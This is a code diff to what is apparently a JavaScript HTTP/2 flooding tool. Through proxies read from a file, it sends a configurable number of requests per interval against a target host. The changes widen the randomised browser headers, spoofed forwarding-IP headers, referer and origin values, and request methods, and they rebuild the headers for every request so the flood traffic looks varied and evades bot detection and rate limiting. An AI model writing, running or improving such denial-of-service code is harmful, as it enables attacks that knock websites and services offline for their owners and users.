@@ -51,7 +51,8 @@ const sig = [
     'hmac_sha256',
     'ecdsa_secp384r1_sha384',
     'rsa_pkcs1_sha1',
-    'hmac_sha1'
+    'hmac_sha1',
+    'ecdsa_secp521r1_sha512'
 ];
 
 const accept_header = [
@@ -61,25 +62,26 @@ const accept_header = [
     'image/webp,image/apng',
     'text/html',
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'application/json',
+    'application/json, text/javascript',
     'application/xml',
     'application/pdf',
     'text/css',
-    'application/javascript'
+    'application/javascript',
+    'text/plain'
 ];
 
 const lang_header = [
     'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-    'ko-KR',
-    'en-US',
-    'zh-CN',
-    'zh-TW',
-    'en-ZA',
-    'fr-FR',
-    'ja-JP',
-    'ar-EG',
-    'de-DE',
-    'es-ES'
+    'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
+    'en-US,en;q=0.9',
+    'zh-CN,zh;q=0.9',
+    'zh-TW,zh;q=0.9,en-US;q=0.8',
+    'en-ZA,en;q=0.9',
+    'fr-FR,fr;q=0.9,en-US;q=0.8',
+    'ja-JP,ja;q=0.9,en-US;q=0.8',
+    'ar-EG,ar;q=0.9',
+    'de-DE,de;q=0.9,en-US;q=0.8',
+    'es-ES,es;q=0.9,en-US;q=0.8'
 ];
 
 const encoding_header = [
@@ -88,24 +90,30 @@ const encoding_header = [
     'gzip, deflate, lzma, sdch',
     'identity',
     'compress',
-    'br'
+    'br',
+    'gzip',
+    'deflate, br'
 ];
 
 const methods = [
-    "GET", "HEAD", "POST", "DELETE", "PATCH"
+    "GET", "HEAD", "POST", "DELETE", "PATCH", "PUT", "OPTIONS"
 ];
 
 const cache_control = [
     'max-age=0',
     'no-cache',
     'no-store',
-    'must-revalidate'
+    'must-revalidate',
+    'private',
+    'public, max-age=31536000'
 ];
 
 const sec_ch_ua = [
     '"Chromium";v="137", "Not/A)Brand";v="24"',
     '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
-    '"Microsoft Edge";v="137", "Chromium";v="137", "Not/A)Brand";v="24"'
+    '"Microsoft Edge";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
+    '"Chromium";v="136", "Not/A)Brand";v="99"',
+    '"Google Chrome";v="136", "Chromium";v="136", "Not/A)Brand";v="99"'
 ];
 
 const sec_ch_ua_platform = [
@@ -121,7 +129,11 @@ const rateHeaders = [
     { "proxy-client-ip": randstr(12) },
     { "via": randstr(12) },
     { "cluster-ip": randstr(12) },
-    { "user-agent": randstr(12) }
+    { "x-forwarded-for": randstr(12) },
+    { "x-forwarded-host": randstr(12) },
+    { "x-real-ip": randstr(12) },
+    { "referer": `https://${parsedTarget.host}/${randstr(10)}` },
+    { "origin": `https://${parsedTarget.host}` }
 ];
 
 const proxies = readLines(args.proxyFile);
@@ -192,25 +204,6 @@ function generateUserAgent() {
 
 const Socker = new NetSocket();
 
-headers[":method"] = randomElement(methods);
-headers[":authority"] = parsedTarget.host;
-headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
-headers[":scheme"] = "https";
-headers["user-agent"] = generateUserAgent();
-headers["accept"] = randomElement(accept_header);
-headers["accept-encoding"] = randomElement(encoding_header);
-headers["accept-language"] = randomElement(lang_header);
-headers["cache-control"] = randomElement(cache_control);
-headers["sec-ch-ua"] = randomElement(sec_ch_ua);
-headers["sec-ch-ua-mobile"] = "?0";
-headers["sec-ch-ua-platform"] = randomElement(sec_ch_ua_platform);
-headers["sec-fetch-dest"] = "document";
-headers["sec-fetch-mode"] = "navigate";
-headers["sec-fetch-site"] = "none";
-headers["sec-fetch-user"] = "?1";
-headers["upgrade-insecure-requests"] = "1";
-headers["x-requested-with"] = "XMLHttpRequest";
-
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
@@ -279,8 +272,30 @@ function runFlooder() {
         client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
                 const dynHeaders = {
-                    ...headers,
-                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
+                    ":method": randomElement(methods),
+                    ":authority": parsedTarget.host,
+                    ":path": parsedTarget.path + "?" + randstr(10) + "=" + randstr(5),
+                    ":scheme": "https",
+                    "user-agent": generateUserAgent(),
+                    "accept": randomElement(accept_header),
+                    "accept-encoding": randomElement(encoding_header),
+                    "accept-language": randomElement(lang_header),
+                    "cache-control": randomElement(cache_control),
+                    "sec-ch-ua": randomElement(sec_ch_ua),
+                    "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
+                    "sec-ch-ua-platform": randomElement(sec_ch_ua_platform),
+                    "sec-fetch-dest": randomElement(["document", "script", "image", "style"]),
+                    "sec-fetch-mode": randomElement(["navigate", "cors", "no-cors"]),
+                    "sec-fetch-site": randomElement(["none", "same-origin", "cross-site"]),
+                    "sec-fetch-user": "?1",
+                    "upgrade-insecure-requests": "1",
+                    "x-requested-with": "XMLHttpRequest",
+                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
+                    "referer": `https://${parsedTarget.host}/${randstr(10)}`,
+                    "origin": `https://${parsedTarget.host}`,
+                    "x-forwarded-for": randstr(12),
+                    "x-forwarded-host": randstr(12),
+                    "x-real-ip": randstr(12)
                 };
                 for (let i = 0; i < args.Rate; i++) {
                     const request = client.request(dynHeaders);
